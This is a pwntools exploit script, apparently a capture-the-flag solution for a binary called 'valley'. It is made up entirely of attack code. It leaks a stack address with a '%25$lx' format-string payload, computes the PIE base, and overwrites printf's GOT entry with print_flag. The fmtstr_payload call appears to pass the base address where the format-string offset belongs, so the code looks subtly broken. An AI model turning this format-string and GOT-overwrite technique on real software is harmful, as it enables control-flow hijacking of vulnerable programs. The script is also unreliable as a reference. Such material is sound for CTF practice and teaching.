from pwn import *

elf = context.binary = ELF("./valley", checksec=False)
p = process("./valley")

payload = b"%25$lx"
# payload = b"sd"

p.recvuntil(b"Shouting:")
p.sendline(payload)

a = p.recvline()

offset_dynamic_address = p.recvline().decode()

static_main_addr = 0x000000000001401
elf.address = int(offset_dynamic_address.strip().split(" ")[5],16) - static_main_addr
# print(elf.address)

payload = fmtstr_payload(elf.address, {elf.got['printf']: elf.symbols['print_flag']})

# print(payload)
# payload = b"as"
# print(hex(elf.got['printf']))
# print(hex(elf.symbols['print_flag'] + elf.binary_address))

# p.recvuntil(b"You")
# print(payload)
# p.recvuntil(b"")
p.sendline(payload)
# p.interactive()


p.sendline(b"tes")
print(p.recvline().decode())
# print(p.recvall())
p.interactive()

p.close()
